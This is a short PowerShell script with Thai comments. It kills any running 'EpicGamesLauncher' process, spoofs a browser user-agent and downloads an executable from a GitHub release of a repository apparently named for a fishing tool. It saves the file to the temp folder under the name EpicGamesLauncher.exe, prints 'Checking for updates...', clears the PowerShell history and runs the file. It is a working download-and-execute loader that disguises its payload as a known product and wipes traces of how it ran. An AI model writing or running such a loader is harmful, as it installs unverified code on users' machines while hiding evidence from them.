# ปิด SilentlyContinue ชั่วคราวเพื่อให้เห็น Error ของจริง
# $ErrorActionPreference = "SilentlyContinue"

# ==========================================
# 🌟 บังคับใช้ TLS 1.2 สำหรับเชื่อมต่อ GitHub
# ==========================================
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# 1. ข้อมูลไฟล์และลิงก์
$downloadUrl = "https://github.com/GRILLYje/Fishing_Wip_public/releases/download/V1.0.5/EpicGamesLauncher.exe" 
$tempPath = "$env:TEMP\EpicGamesLauncher.exe"

# 🌟 ป้องกันปัญหาโหลดทับไม่ได้เพราะโปรแกรมรันค้างอยู่
Stop-Process -Name "EpicGamesLauncher" -Force -ErrorAction SilentlyContinue
Start-Sleep -Seconds 1

# 2. เช็คไฟล์เก่าและลบทิ้ง
if (Test-Path $tempPath) {
    Remove-Item $tempPath -Force
}

Write-Host "Checking for updates..." -ForegroundColor Cyan

# 3. ดาวน์โหลดไฟล์ (WebClient)
try {
    $webClient = New-Object System.Net.WebClient
    # 🌟 เพิ่ม User-Agent ป้องกัน GitHub บล็อคคำสั่งจาก PowerShell
    $webClient.Headers.Add("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
    $webClient.DownloadFile($downloadUrl, $tempPath)
    $webClient.Dispose()
    Write-Host "Download Complete!" -ForegroundColor Green
} catch {
    Write-Host "❌ An error occurred while downloading the file:" -ForegroundColor Red
    # 🌟 สั่งให้คาย Error ของจริงออกมา จะได้รู้ว่าพังเพราะอะไร
    Write-Host $_.Exception.Message -ForegroundColor Yellow
    Exit
}

# ==========================================
# 🌟 ส่วนที่เพิ่ม: ลบประวัติ PowerShell History
# ==========================================
try {
    $historyPath = (Get-PSReadLineOption).HistorySavePath
    if (Test-Path $historyPath) {
        Clear-Content -Path $historyPath
    }
    Clear-History
} catch {
}
# ==========================================

# 4. รันโปรแกรม 
Write-Host "Launching..." -ForegroundColor Green
Start-Process -FilePath $tempPath
